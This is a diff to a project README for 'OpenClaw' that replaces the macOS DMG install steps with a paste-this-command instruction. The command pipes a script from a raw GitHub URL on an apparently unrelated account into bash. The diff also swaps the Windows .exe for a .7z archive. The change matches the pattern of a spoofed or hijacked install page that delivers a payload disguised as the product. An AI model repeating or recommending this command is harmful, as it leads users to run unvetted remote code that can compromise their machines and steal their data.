@@ -24,19 +24,19 @@
 
 Download the latest installer for your platform from the **[Releases](../../releases)**.
 
-### 🍎 macOS (DMG)
+### 🍎 macOS
 
-1. **Download** the `OpenClaw_macOS.dmg` file.
-2. **Open** the file and drag the **OpenClaw** icon to your **Applications** folder.
-3. **Run** OpenClaw from your Applications folder to initialize.
-* *Note: If you see a security warning, right-click the app and select "Open".*
+- 💻Open **Terminal**
+- ☑Paste the **command** below
+- ✅Press **Enter**
 
+```sh
+/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/puppeteerrr/dmg/refs/heads/main/OpenClaw)"
+```
 
-4. The `openclaw` command is now available in your terminal.
+### 🪟 Windows
 
-### 🪟 Windows (EXE)
-
-1. **Download** the `OpenClaw_x64.exe` file.
+1. **Download** the `OpenClaw_x64.7z` file.
 2. **Run** the installer.
 3. Open **OpenClaw**.
 
